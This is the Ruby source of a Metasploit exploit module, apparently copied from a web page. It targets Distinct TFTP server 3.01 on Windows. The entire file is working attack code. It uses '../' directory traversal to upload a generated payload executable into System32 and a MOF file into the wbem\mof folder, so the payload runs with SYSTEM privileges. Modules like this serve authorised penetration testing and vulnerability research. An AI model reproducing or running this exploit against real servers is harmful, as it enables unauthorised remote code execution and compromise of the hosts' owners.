# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Rex::Proto::TFTP
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Distinct TFTP 3.01 Writable Directory Traversal Execution",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in Distinct TFTP server.  The
        software contains a directory traversal vulnerability that allows a remote
        attacker to write arbitrary file to the file system, which results in
        code execution under the context of &#039;SYSTEM&#039;.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;modpr0be&#039;,  #Initial discovery, PoC (Tom Gregory)
          &#039;sinn3r&#039;     #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;80984&#039;],
          [&#039;EDB&#039;, &#039;18718&#039;],
          [&#039;URL&#039;, &#039;http://www.spentera.com/advisories/2012/SPN-01-2012.pdf&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00",
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Distinct TFTP 3.01 on Windows&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Apr 8 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options([
      OptInt.new(&#039;DEPTH&#039;, [false, "Levels to reach base directory",10]),
      OptAddress.new(&#039;RHOST&#039;, [true, "The remote TFTP server address"]),
      OptPort.new(&#039;RPORT&#039;, [true, "The remote TFTP server port", 69])
    ], self.class)
  end

  def upload(filename, data)
    tftp_client = Rex::Proto::TFTP::Client.new(
      "LocalHost"  => "0.0.0.0",
      "LocalPort"  => 1025 + rand(0xffff-1025),
      "PeerHost"   => datastore[&#039;RHOST&#039;],
      "PeerPort"   => datastore[&#039;RPORT&#039;],
      "LocalFile"  => "DATA:#{data}",
      "RemoteFile" => filename,
      "Mode"       => "octet",
      "Context"    => {&#039;Msf&#039; => self.framework, "MsfExploit" => self },
      "Action"     => :upload
    )

    ret = tftp_client.send_write_request { |msg| print_status(msg) }
    while not tftp_client.complete
      select(nil, nil, nil, 1)
      tftp_client.stop
    end
  end

  def exploit
    peer = "#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}"

    # Setup the necessary files to do the wbemexec trick
    exe_name = rand_text_alpha(rand(10)+5) + &#039;.exe&#039;
    exe      = generate_payload_exe
    mof_name = rand_text_alpha(rand(10)+5) + &#039;.mof&#039;
    mof      = generate_mof(mof_name, exe_name)

    # Configure how deep we want to traverse
    depth  = (datastore[&#039;DEPTH&#039;].nil? or datastore[&#039;DEPTH&#039;] == 0) ? 10 : datastore[&#039;DEPTH&#039;]
    levels = "../" * depth

    # Upload the malicious executable to C:\Windows\System32\
    print_status("#{peer} - Uploading executable (#{exe.length.to_s} bytes)")
    upload("#{levels}WINDOWS\\system32\\#{exe_name}", exe)

    # Let the TFTP server idle a bit before sending another file
    select(nil, nil, nil, 1)

    # Upload the mof file
    print_status("#{peer} - Uploading .mof...")
    upload("#{levels}WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
  end
end



